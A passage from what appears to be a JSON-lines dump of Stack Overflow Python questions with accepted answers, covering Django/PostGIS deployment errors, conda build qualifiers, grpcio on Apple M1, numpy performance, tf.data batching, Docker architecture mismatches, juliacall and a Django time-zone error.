wrapped\nremote:     res = handle_func(*args, **kwargs)\nremote:   File \"/app/.heroku/python/lib/python3.9/site-packages/django/core/management/commands/migrate.py\", line 106, in handle\nremote:     connection.prepare_database()\nremote:   File \"/app/.heroku/python/lib/python3.9/site-packages/django/contrib/gis/db/backends/postgis/base.py\", line 26, in prepare_database\nremote:     cursor.execute(\"CREATE EXTENSION IF NOT EXISTS postgis\")\nremote:   File \"/app/.heroku/python/lib/python3.9/site-packages/sentry_sdk/integrations/django/__init__.py\", line 544, in execute\nremote:     return real_execute(self, sql, params)\nremote:   File \"/app/.heroku/python/lib/python3.9/site-packages/django/db/backends/utils.py\", line 67, in execute\nremote:     return self._execute_with_wrappers(\nremote:   File \"/app/.heroku/python/lib/python3.9/site-packages/django/db/backends/utils.py\", line 80, in _execute_with_wrappers\nremote:     return executor(sql, params, many, context)\nremote:   File \"/app/.heroku/python/lib/python3.9/site-packages/django/db/backends/utils.py\", line 89, in _execute\nremote:     return self.cursor.execute(sql, params)\nremote:   File \"/app/.heroku/python/lib/python3.9/site-packages/django/db/utils.py\", line 91, in __exit__\nremote:     raise dj_exc_value.with_traceback(traceback) from exc_value\nremote:   File \"/app/.heroku/python/lib/python3.9/site-packages/django/db/backends/utils.py\", line 87, in _execute\nremote:     return self.cursor.execute(sql)\nremote: django.db.utils.ProgrammingError: relation \"spatial_ref_sys\" does not exist\nremote: \nremote: Sentry is attempting to send 2 pending error messages\nremote: Waiting up to 2 seconds\nremote: Press Ctrl-C to quit\nremote: Waiting for release.... failed.\nTo https://git.heroku.com/myherokuapp\n\n",
    "AcceptedAnswerId": 73220201,
    "AcceptedAnswer": "I've worked around it by overwriting the postgis/base.py engine, I've put the following in my app under db/base.py\nfrom django.contrib.gis.db.backends.postgis.base import (\n     DatabaseWrapper as PostGISDatabaseWrapper,\n)\n\nclass DatabaseWrapper(PostGISDatabaseWrapper):\n    def prepare_database(self):\n        # This is the overwrite - we don't want to call the\n        # super() because of a faulty extension creation\n     pass\n\nThen in my settings I've just pointed the DATABASES[\"engine\"] = \"app.db\"\nIt won't help with backups but at least I can release again.\n"
}
{
    "Id": 74819091,
    "PostTypeId": 1,
    "Title": "Single \"=\" after dependency version specifier in setup.py",
    "Body": "I'm looking at a setup.py with this syntax:\nfrom setuptools import setup\n\nsetup(\n...\n    tests_require=[\"h5py>=2.9=mpi*\",\n                   \"mpi4py\"]\n)\n\nI understand the idea of the \">=\" where h5py should be at least version 2.9, but I cannot for the life of me understand the =mpi* afterwards. Is it saying the version should somehow match the mpi version, while also being at least 2.9?\nI can't find anything that explains specifying python package versions that also explains the use of a single =.\nThe only other place I've found it used is some obscure blog post that seemed to imply it was sort of like importing the package with an alias, which doesn't make much sense to me; and also the mpi4py docs that include a command line snippet conda install -c conda-forge h5py=*=mpi* netcdf4=*=mpi* but don't really explain it.\n",
    "AcceptedAnswerId": 74819586,
    "AcceptedAnswer": "Short answer\nThe =mpi* qualifier says that you want to install h5py pre-compiled with MPI support.\nDetails\nIf you look at the documentation for h5py, you'll see references to having to build it with or without MPI explicitly (e.g., see https://docs.h5py.org/en/latest/build.html).\nWhen you look at the conda-forge download files (https://anaconda.org/conda-forge/h5py/files) you'll also see that there are a bunch of nompi variants and a bunch of mpi variants.\nAdding =mpi* triggers getting a version that's been compiled with MPI so that you get parallel MPI support, while I suspect the default version would come without MPI support.\nExperimentation with and without\nWhen I do conda install -c conda-forge h5py=3.7, conda proposes to download this bundle:\nh5py-3.7.0-nompi_py39hd4deaf1_100\n\nBut when I did conda install =c conda-forget h5py=3.7=mpi*, I expected a ...-mpi_py... bundle but instead it just failed because I'm on Windows and MPI is not supported on Windows as far as I can tell. (And that makes sense, HPC clusters with MPI run on Linux.)\n"
}
{
    "Id": 73406581,
    "PostTypeId": 1,
    "Title": "python manage.py collectstatic error: cannot find rest_framework bootstrap.min.css.map (from book 'Django for APIs')",
    "Body": "I am reading the book 'Django for APIs' from 'William S. Vincent' (current edition for Django 4.0)\nIn chapter 4, I cannot run successfully the command python manage.py collectstatic.\nI get the following error:\nTraceback (most recent call last):\n  File \"/Users/my_name/Projects/django/django_for_apis/library/manage.py\", line 22, in \n    main()\n  File \"/Users/my_name/Projects/django/django_for_apis/library/manage.py\", line 18, in main\n    execute_from_command_line(sys.argv)\n  File \"/Users/my_name/Projects/django/django_for_apis/library/.venv/lib/python3.10/site-packages/django/core/management/__init__.py\", line 446, in execute_from_command_line\n    utility.execute()\n  File \"/Users/my_name/Projects/django/django_for_apis/library/.venv/lib/python3.10/site-packages/django/core/management/__init__.py\", line 440, in execute\n    self.fetch_command(subcommand).run_from_argv(self.argv)\n  File \"/Users/my_name/Projects/django/django_for_apis/library/.venv/lib/python3.10/site-packages/django/core/management/base.py\", line 402, in run_from_argv\n    self.execute(*args, **cmd_options)\n  File \"/Users/my_name/Projects/django/django_for_apis/library/.venv/lib/python3.10/site-packages/django/core/management/base.py\", line 448, in execute\n    output = self.handle(*args, **options)\n  File \"/Users/my_name/Projects/django/django_for_apis/library/.venv/lib/python3.10/site-packages/django/contrib/staticfiles/management/commands/collectstatic.py\", line 209, in handle\n    collected = self.collect()\n  File \"/Users/my_name/Projects/django/django_for_apis/library/.venv/lib/python3.10/site-packages/django/contrib/staticfiles/management/commands/collectstatic.py\", line 154, in collect\n    raise processed\nwhitenoise.storage.MissingFileError: The file 'rest_framework/css/bootstrap.min.css.map' could not be found with .\n\nThe CSS file 'rest_framework/css/bootstrap.min.css' references a file which could not be found:\n  rest_framework/css/bootstrap.min.css.map\n\nPlease check the URL references in this CSS file, particularly any\nrelative paths which might be pointing to the wrong location. \n\nI have the exact same settings like in the book in settings.py:\nSTATIC_URL = \"static/\"\nSTATICFILES_DIRS = [BASE_DIR / \"static\"]  # new\nSTATIC_ROOT = BASE_DIR / \"staticfiles\"  # new\nSTATICFILES_STORAGE = \"whitenoise.storage.CompressedManifestStaticFilesStorage\"  # new\n\nI couldn't find any explanation for it. maybe someone can point me in the right direction.\n",
    "AcceptedAnswerId": 73411956,
    "AcceptedAnswer": "Update: DRF 3.14.0 now supports Django 4.1. If you've added stubs to static as per below, be sure to remove them.\nThis appears to be related to Django 4.1: either downgrade to Django 4.0 or simply create the following empty files in one of your static directories:\nstatic/rest_framework/css/bootstrap-theme.min.css.map\nstatic/rest_framework/css/bootstrap.min.css.map\n\nThere's a recent change to ManifestStaticFilesStorage where it now attempts to replace source maps with their hashed counterparts.\nDjango REST framework has only recently added the bootstrap css source maps but is not yet released.\n"
}
{
    "Id": 72620996,
    "PostTypeId": 1,
    "Title": "Apple M1 - Symbol not found: _CFRelease while running Python app",
    "Body": "I am hoping to run my app without any problem, but I got this attached error. Could someone help or point me into the right direction as to why this is happening?\nTraceback (most recent call last):\n  File \"/Users/andre.sitorus/Documents/GitHub/nexus/automation-api/app/main.py\", line 4, in \n    from configurations import config  # noqa # pylint: disable=unused-import\n  File \"/Users/andre.sitorus/Documents/GitHub/nexus/automation-api/app/configurations/config.py\", line 7, in \n    from google.cloud import secretmanager\n  File \"/Users/andre.sitorus/opt/miniconda3/envs/nexus/lib/python3.9/site-packages/google/cloud/secretmanager.py\", line 20, in \n    from google.cloud.secretmanager_v1 import SecretManagerServiceClient\n  File \"/Users/andre.sitorus/opt/miniconda3/envs/nexus/lib/python3.9/site-packages/google/cloud/secretmanager_v1/__init__.py\", line 24, in \n    from google.cloud.secretmanager_v1.gapic import secret_manager_service_client\n  File \"/Users/andre.sitorus/opt/miniconda3/envs/nexus/lib/python3.9/site-packages/google/cloud/secretmanager_v1/gapic/secret_manager_service_client.py\", line 25, in \n    import google.api_core.gapic_v1.client_info\n  File \"/Users/andre.sitorus/opt/miniconda3/envs/nexus/lib/python3.9/site-packages/google/api_core/gapic_v1/__init__.py\", line 18, in \n    from google.api_core.gapic_v1 import config\n  File \"/Users/andre.sitorus/opt/miniconda3/envs/nexus/lib/python3.9/site-packages/google/api_core/gapic_v1/config.py\", line 23, in \n    import grpc\n  File \"/Users/andre.sitorus/opt/miniconda3/envs/nexus/lib/python3.9/site-packages/grpc/__init__.py\", line 22, in \n    from grpc import _compression\n  File \"/Users/andre.sitorus/opt/miniconda3/envs/nexus/lib/python3.9/site-packages/grpc/_compression.py\", line 15, in \n    from grpc._cython import cygrpc\nImportError: dlopen(/Users/andre.sitorus/opt/miniconda3/envs/nexus/lib/python3.9/site-packages/grpc/_cython/cygrpc.cpython-39-darwin.so, 2): Symbol not found: _CFRelease\n  Referenced from: /Users/andre.sitorus/opt/miniconda3/envs/nexus/lib/python3.9/site-packages/grpc/_cython/cygrpc.cpython-39-darwin.so\n  Expected in: flat namespace\n in /Users/andre.sitorus/opt/miniconda3/envs/nexus/lib/python3.9/site-packages/grpc/_cython/cygrpc.cpython-39-darwin.so\n\nI'm running  this in Apple M1.\nI already upgraded pip and setuptools before installing all the requirements in my virtual environment using conda. Here is my python, pip, and setuptools version:\npython 3.9.12\npip 21.2.4\nsetuptools 62.4.0\n\n",
    "AcceptedAnswerId": 73245207,
    "AcceptedAnswer": "Had the same issue; turned out it's because of the grpcio build. Doing this helped:\npip uninstall grpcio\nconda install grpcio\n\n(Make sure you use the conda-forge channel with conda; the community puts in work to make sure packages play well with M1/arm64)\n"
}
{
    "Id": 74842741,
    "PostTypeId": 1,
    "Title": "Why is a combination of numpy functions faster than np.mean?",
    "Body": "I am wondering what the fastest way for a mean computation is in numpy. I used the following code to experiment with it:\nimport time\nn = 10000\np = np.array([1] * 1000000)\n\nt1 = time.time()\nfor x in range(n):\n    np.divide(np.sum(p), p.size)\nt2 = time.time()\n\nprint(t2-t1)\n\n3.9222593307495117\nt3 = time.time()\nfor x in range(n):\n    np.mean(p)\nt4 = time.time()\n\nprint(t4-t3)\n\n5.271147012710571\nI would assume that np.mean would be faster or at least equivalent in speed, however it looks like the combination of numpy functions is faster than np.mean. Why is the combination of numpy functions faster?\n",
    "AcceptedAnswerId": 74842967,
    "AcceptedAnswer": "For integer input, by default, numpy.mean computes the sum in float64 dtype. This prevents overflow errors, but it requires a conversion for every element.\nYour code with numpy.sum only converts once, after the sum has been computed.\n"
}
{
    "Id": 73821277,
    "PostTypeId": 1,
    "Title": "Generate Permutation With Minimum Guaranteed Distance from Elements in Source",
    "Body": "Given a sequence a with n unique elements, I want to create a sequence b which is a randomly selected permutation of a such that there is at least a specified minimum distance d between duplicate elements of the sequence which is b appended to a.\nFor example, if a = [1,2,3] and d = 2, of the following permutations:\na         b\n[1, 2, 3] (1, 2, 3) mindist = 3\n[1, 2, 3] (1, 3, 2) mindist = 2\n[1, 2, 3] (2, 1, 3) mindist = 2\n[1, 2, 3] (2, 3, 1) mindist = 2\n[1, 2, 3] (3, 1, 2) mindist = 1\n[1, 2, 3] (3, 2, 1) mindist = 1\n\nb could only take one of the first four values since the minimum distance for the last two is 1 .\nI wrote the following implementation:\nimport random\nn = 10\nalist = list(range(n))\n\nblist = alist[:]\n\nd = n//2\n\navail_indices = list(range(n))\nfor a_ind, a_val in enumerate(reversed(alist)):\n  min_ind = max(d - a_ind - 1, 0)\n  new_ind = random.choice(avail_indices[min_ind:])\n  avail_indices.remove(new_ind)\n  blist[new_ind] = a_val\nprint(alist, blist)\n\n[0, 1, 2, 3, 4, 5, 6, 7, 8, 9] [1, 3, 2, 8, 5, 6, 4, 0, 9, 7]\n\nbut I think this is n^2 time complexity (not completely sure). Here's a plot of the time required as n increases for d = n//2:\n\nIs it possible to do better than this?\n",
    "AcceptedAnswerId": 73821711,
    "AcceptedAnswer": "Yes, your implementation is O(n^2).\nYou can adapt the Fisher-Yates shuffle to this purpose.  What you do is work from the start of an array to the end, placing the final value into place out of the remaining.\nThe trick is that while in a full shuffle you can place any element at the start, you can only place from an index that respects the distance condition.\nHere is an implementation.\nimport random\n\ndef distance_permutation (orig, d):\n    answer = orig.copy()\n    for i in range(len(orig)):\n        choice = random.randrange(i, min(len(orig), len(orig) + i - d + 1))\n        if i < choice:\n            (answer[i], answer[choice]) = (answer[choice], answer[i])\n    return answer\n\n\nn = 10\nx = list(range(n))\nprint(x, distance_permutation(x, n//2))\n\n"
}
{
    "Id": 73464414,
    "PostTypeId": 1,
    "Title": "Why are generics in Python implemented using __class_getitem__ instead of __getitem__ on metaclass",
    "Body": "I was reading python documentation and peps and couldn't find an answer for this.\nGenerics in python are implemented by subscripting class objects. list[str] is a list where all elements are strings.\nThis behaviour is achieved by implementing a special (dunder) classmethod called __class_getitem__ which as the documentation states should return a GenericAlias.\nAn example:\nclass MyGeneric:\n    def __class_getitem__(cls, key):\n        # implement generics\n        ...\n\nThis seems weird to me because the documentation also shows some code similar to what the interpreter does when faced with subscripting objects and shows that defining both __getitem__ on object's metaclass and __class_getitem__ on the object itself always chooses the metaclass' __getitem__. This means that a class with the same functionality as the one above can be implemented without introducing a new special method into the language.\nAn example of a class with identical behaviour:\nclass GenericMeta(type):\n    def __getitem__(self, key):\n        # implement generics\n        ...\n\n\nclass MyGeneric(metaclass=GenericMeta):\n    ...\n\nLater the documentation also shows an example of Enums using a __getitem__ of a metaclass as an example of a __class_getitem__ not being called.\nMy question is why was the __class_getitem__ classmethod introduced in the first place?\nIt seems to do the exact same thing as the metaclass' __getitem__ but with the added complexity and the need for extra code in the interpreter for deciding which method to call. All of this comes with no extra benefit as defining both will simply call the same one every time unless specifically calling dunder methods (which should not be done in general).\nI know that implementing generics this way is discouraged. The general approach is to subclass a class that already defines a __class_getitem__ like typing.Generic but I'm still curious as to why that functionality was implemented that way.\n",
    "AcceptedAnswerId": 73464466,
    "AcceptedAnswer": "__class_getitem__ exists because using multiple inheritance where multiple metaclasses are involved is very tricky and sets limitations that can\u2019t always be met when using 3rd-party libraries.\nWithout __class_getitem__ generics requires a metaclass, as defining a  __getitem__ method on a class would only handle attribute access on instances, not on the class. Normally, object[...] syntax is handled by the type of object, not by object itself. For instances, that's the class, but for classes, that's the metaclass.\nSo, the syntax:\nClassObject[some_type]\n\nwould translate to:\ntype(ClassObject).__getitem__(ClassObject, some_type)\n\n__class_getitem__ exists to avoid having to give every class that needs to support generics, a metaclass.\nFor how __getitem__ and other special methods work, see the Special method lookup section in the Python Datamodel chapter:\n\nFor custom classes, implicit invocations of special methods are only guaranteed to work correctly if defined on an object\u2019s type, not in the object\u2019s instance dictionary.\n\nThe same chapter also explicitly covers __class_getitem__ versus __getitem__:\n\nUsually, the subscription of an object using square brackets will call the __getitem__() instance method defined on the object\u2019s class. However, if the object being subscribed is itself a class, the class method __class_getitem__() may be called instead.\n\nThis section also covers what will happen if the class has both a metaclass with a __getitem__ method, and a __class_getitem__ method defined on the class itself. You found this section, but it only applies in this specific corner-case.\nAs stated, using metaclasses can be tricky, especially when inheriting from classes with different metaclasses. See the original PEP 560 - Core support for typing module and generic types proposal:\n\nAll generic types are instances of GenericMeta, so if a user uses a custom metaclass, then it is hard to make a corresponding class generic. This is particularly hard for library classes that a user doesn\u2019t control.\n...\nWith the help of the proposed special attributes the GenericMeta metaclass will not be needed.\n\nWhen mixing multiple classes with different metaclasses, Python requires that the most specific metaclass derives from the other metaclasses, a requirement that can't easily be met if the metaclass is not your own; see the documentation on determining the appropriate metaclass.\nAs a side note, if you do use a metaclass, then __getitem__ should not be a classmethod:\nclass GenericMeta(type):\n    # not a classmethod! `self` here is a class, an instance of this\n    # metaclass.\n    def __getitem__(self, key):\n        # implement generics\n        ...\n\nBefore PEP 560, that's basically what the typing.GenericMeta metaclass did, albeit with a bit more complexity.\n"
}
{
    "Id": 73569804,
    "PostTypeId": 1,
    "Title": "Dataset.batch doesn't work as expected with a zipped dataset",
    "Body": "I have a dataset like this:\na = tf.data.Dataset.range(1, 16)\nb = tf.data.Dataset.range(16, 32)\nzipped = tf.data.Dataset.zip((a, b))\nlist(zipped.as_numpy_iterator())\n\n# output: \n[(0, 16),\n (1, 17),\n (2, 18),\n (3, 19),\n (4, 20),\n (5, 21),\n (6, 22),\n (7, 23),\n (8, 24),\n (9, 25),\n (10, 26),\n (11, 27),\n (12, 28),\n (13, 29),\n (14, 30),\n (15, 31)]\n\nWhen I apply batch(4) to it, the expected result is an array of batches, where each batch contains four tuples:\n[[(0, 16), (1, 17), (2, 18), (3, 19)],\n [(4, 20), (5, 21), (6, 22), (7, 23)],\n [(9, 24), (10, 25), (10, 26), (11, 27)],\n [(12, 28), (13, 29), (14, 30), (15, 31)]]\n\nBut this is what I receive instead:\nbatched = zipped.batch(4)\nlist(batched.as_numpy_iterator())\n\n# Output:\n[(array([0, 1, 2, 3]), array([16, 17, 18, 19])), \n (array([4, 5, 6, 7]), array([20, 21, 22, 23])), \n (array([ 8,  9, 10, 11]), array([24, 25, 26, 27])), \n (array([12, 13, 14, 15]), array([28, 29, 30, 31]))]\n\nI'm following this tutorial, he does the same steps but gets the correct output somehow.\n\nUpdate: according to the documentation this is the intended behavior:\n\nThe components of the resulting element will have an additional outer dimension, which will be batch_size\n\nBut it doesn't make any sense. To my understanding, dataset is a list of pieces of data. It doesn't matter the shape of those pieces of data, when we are batching it we are combining the elements [whatever their shape is] into batches, therefore it should always insert the new dimention to the second position ((length, a, b, c) -> (length', batch_size, a, b, c)).\nSo my questions are: I wonder what is the purpose of batch() being implemented this way? And what is the alternative that does what I described?\n",
    "AcceptedAnswerId": 73583522,
    "AcceptedAnswer": "One thing you can try doing is something like this:\nimport tensorflow as tf\n\na = tf.data.Dataset.range(16)\nb = tf.data.Dataset.range(16, 32)\nzipped = tf.data.Dataset.zip((a, b)).batch(4).map(lambda x, y: tf.transpose([x, y]))\n\nlist(zipped.as_numpy_iterator())\n\n[array([[ 0, 16],\n        [ 1, 17],\n        [ 2, 18],\n        [ 3, 19]]), \n array([[ 4, 20],\n        [ 5, 21],\n        [ 6, 22],\n        [ 7, 23]]), \n array([[ 8, 24],\n        [ 9, 25],\n        [10, 26],\n        [11, 27]]), \n array([[12, 28],\n        [13, 29],\n        [14, 30],\n        [15, 31]])]\n\nbut they are still not tuples. Or:\nzipped = tf.data.Dataset.zip((a, b)).batch(4).map(lambda x, y: tf.unstack(tf.transpose([x, y]), num = 4))\n\n[(array([ 0, 16]), array([ 1, 17]), array([ 2, 18]), array([ 3, 19])), (array([ 4, 20]), array([ 5, 21]), array([ 6, 22]), array([ 7, 23])), (array([ 8, 24]), array([ 9, 25]), array([10, 26]), array([11, 27])), (array([12, 28]), array([13, 29]), array([14, 30]), array([15, 31]))]\n\n"
}
{
    "Id": 73285601,
    "PostTypeId": 1,
    "Title": "Docker : exec /usr/bin/sh: exec format error",
    "Body": "Hi guys need some help.\nI created a custom docker image and push it to docker hub but when I run it in CI/CD it gives me this error.\nexec /usr/bin/sh: exec format error\nWhere :\nDockerfile\nFROM ubuntu:20.04\nRUN apt-get update\nRUN apt-get install -y software-properties-common\nRUN apt-get install -y python3-pip\nRUN pip3 install robotframework\n\n.gitlab-ci.yml\nrobot-framework:\n  image: rethkevin/rf:v1\n  allow_failure: true\n  script:\n    - ls\n    - pip3 --version\n\nOutput\nRunning with gitlab-runner 15.1.0 (76984217)\n  on runner zgjy8gPC\nPreparing the \"docker\" executor\nUsing Docker executor with image rethkevin/rf:v1 ...\nPulling docker image rethkevin/rf:v1 ...\nUsing docker image sha256:d2db066f04bd0c04f69db1622cd73b2fc2e78a5d95a68445618fe54b87f1d31f for rethkevin/rf:v1 with digest rethkevin/rf@sha256:58a500afcbd75ba477aa3076955967cebf66e2f69d4a5c1cca23d69f6775bf6a ...\nPreparing environment\n00:01\nRunning on runner-zgjy8gpc-project-1049-concurrent-0 via 1c8189df1d47...\nGetting source from Git repository\n00:01\nFetching changes with git depth set to 20...\nReinitialized existing Git repository in /builds/reth.bagares/test-rf/.git/\nChecking out 339458a3 as main...\nSkipping Git submodules setup\nExecuting \"step_script\" stage of the job script\n00:00\nUsing docker image sha256:d2db066f04bd0c04f69db1622cd73b2fc2e78a5d95a68445618fe54b87f1d31f for rethkevin/rf:v1 with digest rethkevin/rf@sha256:58a500afcbd75ba477aa3076955967cebf66e2f69d4a5c1cca23d69f6775bf6a ...\nexec /usr/bin/sh: exec format error\nCleaning up project directory and file based variables\n00:01\nERROR: Job failed: exit code 1\n\nany thoughts on this to resolve the error?\n",
    "AcceptedAnswerId": 73285704,
    "AcceptedAnswer": "The problem is that you built this image for arm64/v8 -- but your runner is using a different architecture.\nIf you run:\ndocker image inspect rethkevin/rf:v1\n\nYou will see this in the output:\n...\n        \"Architecture\": \"arm64\",\n        \"Variant\": \"v8\",\n        \"Os\": \"linux\",\n...\n\nTry building and pushing your image from your GitLab CI runner so the architecture of the image will match your runner's architecture.\nAlternatively, you can build for multiple architectures using docker buildx . Alternatively still, you could also run a GitLab runner on ARM architecture so that it can run the image for the architecture you built it on.\n"
}
{
    "Id": 74930922,
    "PostTypeId": 1,
    "Title": "How to load a custom Julia package in Python using Python's juliacall",
    "Body": "I already know How to import Julia packages into Python.\nHowever, now I have created my own simple Julia package with the following command:\nusing Pkg;Pkg.generate(\"MyPack\");Pkg.activate(\"MyPack\");Pkg.add(\"StatsBase\")\nwhere the file MyPack/src/MyPack.jl has the following contents:\nmodule MyPack\nusing StatsBase\n\nfunction f1(x, y)\n   return 3x + y\nend\ng(x) = StatsBase.std(x)\n\nexport f1\n\nend\n\nNow I would like to load this Julia package in Python via juliacall and call f1 and g functions.\nI have already run pip3 install juliacall from command line. How do I call the above functions from Python?\n",
    "AcceptedAnswerId": 74930923,
    "AcceptedAnswer": "You need to run the following code to load the MyPack package from Python via juliacall\nfrom juliacall import Main as jl\nfrom juliacall import Pkg as jlPkg\n\njlPkg.activate(\"MyPack\")  # relative path to the folder where `MyPack/Project.toml` should be used here \n\njl.seval(\"using MyPack\")\n\nNow you can use the function (note that calls to non exported functions require package name):\n>>> jl.f1(4,7)\n19\n\n>>> jl.f1([4,5,6],[7,8,9]).to_numpy()\narray([19, 23, 27], dtype=object)\n\n>>> jl.MyPack.g(numpy.arange(0,3))\n1.0\n\nNote another option for calling Julia from Python that seems to be more difficult to configure as of today is the pip install julia package which is described here: I have a high-performant function written in Julia, how can I use it from Python?\n"
}
{
    "Id": 73332533,
    "PostTypeId": 1,
    "Title": "Django 4 Error: 'No time zone found with key ...'",
    "Body": "After rebuild of my Django 4 Docker container the web service stopped working with this error:\n\nzoneinfo._common.ZoneInfoNotFoundError: 'No time zone found with key\nAsia/Hanoi'\n\nMy setup is:\n\nPython 3.10\nDjango 4.0.5\n\nError:\nweb_1              \nTraceback (most recent call last): web_1          \n  File \"/usr/local/lib/python3.10/zoneinfo/_common.py\", line 12, in load_tzdata web_1              \n    return importlib.resources.open_binary(package_name, resource_name) web_1     \n  File \"/usr/local/lib/python3.10/importlib/resources.py\", line 46, in open_binary web_1              \n    return reader.open_resource(resource) web_1              \n  File \"/usr/local/lib/python3.10/importlib/abc.py\", line 433, in open_resource web_1              \n    return self.files().joinpath(resource).open('rb') web_1              \n  File \"/usr/local/lib/python3.10/pathlib.py\", line 1119, in open web_1       \n    return self._accessor.open(self, mode, buffering, encoding, errors, web_1              \nFileNotFoundError: [Errno 2] No such file or directory: '/usr/local/lib/python3.10/site-packages/tzdata/zoneinfo/Asia/Hanoi' web_1              \n web_1              \nDuring handling of the above exception, another exception occurred: web_1              \n web_1              \nTraceback (most recent call last): web_1          \n  File \"/home/app/web/manage.py\", line 22, in  web_1         \n    main() web_1              \n  File \"/home/app/web/manage.py\", line 18, in main web_1              \n    execute_from_command_line(sys.argv) web_1              \n  File \"/usr/local/lib/python3.10/site-packages/django/core/management/__init__.py\", line 446, in execute_from_command_line web_1              \n    utility.execute() web_1              \n  File \"/usr/local/lib/python3.10/site-packages/django/core/management/__init__.py\", line 420, in execute web_1              \n    django.setup() web_1     \n  File \"/usr/local/lib/python3.10/site-packages/django/__init__.py\", line 24, in setup web_1              \n    apps.populate(settings.INSTALLED_APPS) web_1              \n  File \"/usr/local/lib/python3.10/site-packages/django/apps/registry.py\", line 116, in populate web_1              \n    app_config.import_models() web_1              \n  File \"/usr/local/lib/python3.10/site-packages/django/apps/config.py\", line 304, in import_models web_1              \n    self.models_module = import_module(models_module_name) web_1              \n  File \"/usr/local/lib/python3.10/importlib/__init__.py\", line 126, in import_module web_1              \n    return _bootstrap._gcd_import(name[level:], package, level) web_1              \n  File \"\", line 1050, in _gcd_import web_1              \n  File \"\", line 1027, in _find_and_load web_1              \n  File \"\", line 1006, in _find_and_load_unlocked web_1    \n  File \"\", line 688, in _load_unlocked web_1              \n  File \"\", line 883, in exec_module web_1              \n  File \"\", line 241, in _call_with_frames_removed web_1   \n  File \"/usr/local/lib/python3.10/site-packages/django_celery_beat/models.py\", line 8, in  web_1              \n    import timezone_field web_1              \n  File \"/usr/local/lib/python3.10/site-packages/timezone_field/__init__.py\", line 1, in  web_1              \n    from timezone_field.fields import TimeZoneField web_1              \n  File \"/usr/local/lib/python3.10/site-packages/timezone_field/fields.py\", line 11, in  web_1              \n    class TimeZoneField(models.Field): web_1              \n  File \"/usr/local/lib/python3.10/site-packages/timezone_field/fields.py\", line 41, in TimeZoneField web_1              \n    default_zoneinfo_tzs = [ZoneInfo(tz) for tz in pytz.common_timezones] web_1              \n  File \"/usr/local/lib/python3.10/site-packages/timezone_field/fields.py\", line 41, in  web_1              \n    default_zoneinfo_tzs = [ZoneInfo(tz) for tz in pytz.common_timezones] web_1              \n  File \"/usr/local/lib/python3.10/zoneinfo/_common.py\", line 24, in load_tzdata web_1              \n    raise ZoneInfoNotFoundError(f\"No time zone found with key {key}\") web_1              \nzoneinfo._common.ZoneInfoNotFoundError: 'No time zone found with key Asia/Hanoi' web_1              \n[2022-08-12 09:18:36 +0000] [1] [INFO] Starting gunicorn 20.0.4 web_1              \n[2022-08-12 09:18:36 +0000] [1] [INFO] Listening at: http://0.0.0.0:8000 (1) web_1 \n[2022-08-12 09:18:36 +0000] [1] [INFO] Using worker: sync web_1      \n[2022-08-12 09:18:36 +0000] [11] [INFO] Booting worker with pid: 11 web_1              \n[2022-08-12 12:18:37 +0300] [11] [ERROR] Exception in worker process web_1              \nTraceback (most recent call last): web_1              \n  File \"/usr/local/lib/python3.10/zoneinfo/_common.py\", line 12, in load_tzdata web_1              \n    return importlib.resources.open_binary(package_name, resource_name) web_1     \n  File \"/usr/local/lib/python3.10/importlib/resources.py\", line 46, in open_binary web_1              \n    return reader.open_resource(resource) web_1              \n  File \"/usr/local/lib/python3.10/importlib/abc.py\", line 433, in open_resource web_1              \n    return self.files().joinpath(resource).open('rb') web_1              \n  File \"/usr/local/lib/python3.10/pathlib.py\", line 1119, in open web_1       \n    return self._accessor.open(self, mode, buffering, encoding, errors, web_1              \nFileNotFoundError: [Errno 2] No such file or directory: '/usr/local/lib/python3.10/site-packages/tzdata/zoneinfo/Asia/Hanoi' web_1              \n web_1              \nDuring handling of the above exception, another exception occurred: web_1              \n web_1              \nTraceback (most recent call last): web_1          \n  File \"/usr/local/lib/python3.10/site-packages/gunicorn/arbiter.py\", line 583, in spawn_worker web_1              \n    worker.init_process() web_1              \n  File \"/usr/local/lib/python3.10/site-packages/gunicorn/workers/base.py\", line 119, in init_process web_1              \n    self.load_wsgi() web_1              \n  File \"/usr/local/lib/python3.10/site-packages/gunicorn/workers/base.py\", line 144, in load_wsgi web_1              \n    self.wsgi = self.app.wsgi() web_1              \n  File \"/usr/local/lib/python3.10/site-packages/gunicorn/app/base.py\", line 67, in wsgi web_1              \n    self.callable = self.load() web_1 \n  File \"/usr/local/lib/python3.10/site-packages/gunicorn/app/wsgiapp.py\", line 49, in load web_1              \n    return self.load_wsgiapp() web_1              \n  File \"/usr/local/lib/python3.10/site-packages/gunicorn/app/wsgiapp.py\", line 39, in load_wsgiapp web_1              \n    return util.import_app(self.app_uri) web_1              \n  File \"/usr/local/lib/python3.10/site-packages/gunicorn/util.py\", line 358, in import_app web_1              \n    mod = importlib.import_module(module) web_1              \n  File \"/usr/local/lib/python3.10/importlib/__init__.py\", line 126, in import_module web_1              \n    return _bootstrap._gcd_import(name[level:], package, level) web_1              \n  File \"\", line 1050, in _gcd_import web_1              \n  File \"\", line 1027, in _find_and_load web_1              \n  File \"\", line 1006, in _find_and_load_unlocked web_1    \n  File \"\", line 688, in _load_unlocked web_1              \n  File \"\", line 883, in exec_module web_1              \n  File \"\", line 241, in _call_with_frames_removed web_1   \n  File \"/home/app/web/config/wsgi.py\", line 16, in  web_1    \n    application = get_wsgi_application() web_1              \n  File \"/usr/local/lib/python3.10/site-packages/django/core/wsgi.py\", line 12, in get_wsgi_application web_1              \n    django.setup(set_prefix=False) web_1              \n  File \"/usr/local/lib/python3.10/site-packages/django/__init__.py\", line 24, in setup web_1              \n    apps.populate(settings.INSTALLED_APPS) web_1              \n  File \"/usr/local/lib/python3.10/site-packages/django/apps/registry.py\", line 116, in populate web_1              \n    app_config.import_models() web_1              \n  File \"/usr/local/lib/python3.10/site-packages/django/apps/config.py\", line 304, in import_models web_1              \n    self.models_module = import_module(models_module_name) web_1              \n  File \"/usr/local/lib/python3.10/importlib/__init__.py\", line 126, in import_module web_1              \n    return _bootstrap._gcd_import(name[level:], package, level) web_1              \n  File \"\", line 1050, in _gcd_import web_1              \n  File \"\", line 1027, in _find_and_load web_1              \n  File \"\", line 1006, in _find_and_load_unlocked web_1    \n  File \"\", line 688, in _load_unlocked web_1              \n  File \"\", line 883, in exec_module web_1              \n  File \"\", line 241, in _call_with_frames_removed web_1   \n  File \"/usr/local/lib/python3.10/site-packages/django_celery_beat/models.py\", line 8, in  web_1              \n    import timezone_field web_1              \n  File \"/usr/local/lib/python3.10/site-packages/timezone_field/__init__.py\", line 1, in  web_1              \n    from timezone_field.fields import TimeZoneField web_1              \n  File \"/usr/local/lib/python3.10/site-packages/timezone_field/fields.py\", line 11, in  web_1              \n    class 